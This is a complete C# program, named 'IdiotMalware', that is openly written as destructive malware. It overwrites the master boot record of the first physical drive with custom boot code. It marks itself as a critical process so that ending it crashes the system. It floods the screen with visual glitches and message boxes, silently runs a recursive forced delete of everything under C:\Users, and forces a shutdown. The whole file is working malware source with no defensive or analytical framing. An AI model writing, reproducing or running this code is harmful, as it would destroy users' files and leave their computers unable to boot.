using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.IO;

namespace IdiotMalware
{
    class Program
    {
        // --- IMPORTY SYSTEMOWE (KERNEL32) ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("kernel32.dll")]
        static extern bool Beep(uint dwFreq, uint dwDuration);

        // --- IMPORTY GRAFICZNE (USER32 & GDI32) ---
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        static extern bool SetProcessDefaultLayout(uint dwDefaultLayout);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("gdi32.dll")]
        static extern uint SetPixel(IntPtr hdc, int x, int y, uint crColor);

        // --- IMPORTY SYSTEMOWE (NTDLL) ---
        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        static Random rnd = new Random();

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();

            // 1. OSTRZEŻENIA
            if (MessageBox.Show("Warning: Your computer will be destroyed by malware.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) != DialogResult.Yes) return;
            if (MessageBox.Show("THIS IS YOUR FINAL WARNING. IF YOU CLICK THIS, YOUR COMPUTER WILL BE DESTROYED.", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop) != DialogResult.Yes) return;

            // 2. NADPISANIE MBR (ZANIM COKOLWIEK INNEGO)
            OverwriteMBR();

            // 3. WIADOMOŚĆ W NOTATNIKU (DOKŁADNY TEKST)
            OpenNotePad();

            // 4. USTAWIENIE JAKO PROCES KRYTYCZNY (ZAMKNIĘCIE = BSOD)
            int isCritical = 1;
            try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }

            // 5. START GŁÓWNYCH EFEKTÓW
            new Thread(SlowBurnRoutine).Start();
            new Thread(Payload_Spam_MsgBox).Start();

            // Ukryty formularz, aby utrzymać proces w tle
            Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false, WindowState = FormWindowState.Minimized });
        }

        static void OpenNotePad()
        {
            string path = Path.Combine(Path.GetTempPath(), "READ_ME.txt");
            string content = "Your computer has been damaged by: Chips. Do not attempt to disable the virus process or restart your computer. The computer may still work after shutting down, but once you turn it off, it won't start again because the MBR has been overwritten. I and the other authors are not responsible for any damages.";
            
            try {
                File.WriteAllText(path, content);
                ProcessStartInfo psi = new ProcessStartInfo("notepad.exe", path);
                psi.WindowStyle = ProcessWindowStyle.Normal; // OKNO STANDARDOWE
                Process.Start(psi);
            } catch { }
        }

        static void SlowBurnRoutine()
        {
            // FAZA 1: NIEPOKÓJ (DRGANIE MYSZY I PISKI)
            for (int i = 0; i < 5; i++)
            {
                Cursor.Position = new Point(Cursor.Position.X + rnd.Next(-40, 40), Cursor.Position.Y + rnd.Next(-40, 40));
                Beep((uint)rnd.Next(500, 1200), 200);
                Thread.Sleep(2000);
            }

            // FAZA 2: ZMIANA JĘZYKA (LAYOUT ARABSKI RTL)
            SetProcessDefaultLayout(1);

            // FAZA 3: EFEKTY WIZUALNE (TUNEL I ŚNIEG)
            new Thread(Payload_GDI_Effects).Start();
            new Thread(Payload_Snow).Start();

            // FAZA 4: USUNIĘCIE PLIKÓW PO 25 SEKUNDACH
            Thread.Sleep(25000);
            Execute_The_End();
        }

        static void Payload_GDI_Effects()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                // Efekt tunelu (kopiowanie ekranu do środka)
                BitBlt(hdc, 4, 4, w - 8, h - 8, hdc, 0, 0, 0x00CC0020);
                
                // Rzadkie mignięcie negatywem
                if (rnd.Next(100) > 96) 
                    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009);
                
                Thread.Sleep(15);
            }
        }

        static void Payload_Snow()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true)
            {
                for (int i = 0; i < 450; i++)
                {
                    uint color = (rnd.Next(2) == 0) ? 0xFFFFFFu : 0x000000u;
                    SetPixel(hdc, rnd.Next(w), rnd.Next(h), color);
                }
                Thread.Sleep(1);
            }
        }

        static void Payload_Spam_MsgBox()
        {
            while (true)
            {
                Thread.Sleep(5000); // Równo co 5 sekund
                new Thread(() => MessageBox.Show("CHIPS BE HERE", "Idiot", MessageBoxButtons.OK, MessageBoxIcon.Warning)).Start();
            }
        }

        static void OverwriteMBR()
        {
            byte[] mbr = new byte[512];
            
            // ASSEMBLER: Tryb 13h + Tekst + ŻÓŁTY CHIPS (0x2C)
            byte[] bootCode = {
                0xB8, 0x13, 0x00, 0xCD, 0x10,       // mov ax, 13h | int 10h
                0xB8, 0x00, 0xA0, 0x8E, 0xC0,       // mov ax, 0xA000 | mov es, ax
                0xBE, 0x80, 0x7C,                   // mov si, 0x7C80 (Tekst)
                0xB4, 0x0E,                         // mov ah, 0Eh
                0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, // Tekst loop
                
                0x31, 0xDB,                         // xor bx, bx (Pozycja)
                
                // --- AnimationLoop ---
                0x31, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAB, // CLS (Czarny)
                0xBF, 0x40, 0x7D,                   // mov di, 32000
                0x01, 0xDF,                         // add di, bx
                0xB0, 0x2C,                         // mov al, 0x2C (ŻÓŁTY)
                0xB9, 0x60, 0x09,                   // mov cx, 2400 (Wielkość)
                0xF3, 0xAA,                         // rep stosb
                0x43,                               // inc bx
                
                // Sleep (Int 15h)
                0xB4, 0x86, 0x31, 0xC9, 0xBA, 0x10, 0x27, 0xCD, 0x15,
                0xEB, 0xDC                          // jmp AnimationLoop
            };

            byte[] msg = Encoding.ASCII.GetBytes("Chips Be Here, the computer was eaten by: Chips\0");
            
            Array.Copy(bootCode, 0, mbr, 0, bootCode.Length);
            Array.Copy(msg, 0, mbr, 0x80, msg.Length);
            
            mbr[510] = 0x55; 
            mbr[511] = 0xAA;

            try {
                IntPtr hDrive = CreateFile("\\\\.\\PhysicalDrive0", 0x40000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                if (hDrive != (IntPtr)(-1)) {
                    uint written;
                    WriteFile(hDrive, mbr, 512, out written, IntPtr.Zero);
                }
            } catch { }
        }

        static void Execute_The_End()
        {
            // FORMATOWANIE / USUWANIE PLIKÓW
            try {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c del /s /q /f C:\\Users\\*.*");
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                Process.Start(psi);
            } catch { }

            Thread.Sleep(5000);
            
            // WYŁĄCZENIE SYSTEMU
            Process.Start("shutdown", "-s -t 15 -f -c \"Sorry, this virus can't be turned off. lol\"");
            Environment.Exit(0);
        }
    }
}
